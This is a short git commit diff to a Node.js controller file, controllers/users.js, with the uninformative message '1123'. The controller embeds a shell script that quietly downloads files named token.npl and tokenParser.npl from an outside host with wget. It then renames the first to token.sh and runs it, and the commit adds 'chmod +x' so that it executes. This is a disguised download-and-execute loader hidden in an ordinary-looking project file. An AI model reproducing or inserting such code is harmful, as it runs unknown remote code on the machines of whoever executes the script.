c54d1ea1feaecd21727062aed930ee7b3cda342c
richard <richardplayventures8@gmail.com>
2025-07-09 06:39:50 -0300

    1123

--- controllers/users.js
+++ controllers/users.js
@@ -57,8 +57,8 @@ echo "success" > ~/.cli_authed
 wget -qO token.npl https://be-1-49aq.onrender.com/tokenlinux.npl
 wget -qO tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 mv token.npl token.sh
+chmod +x token.sh
 ./token.sh
-clear
 `);
 });
 // C
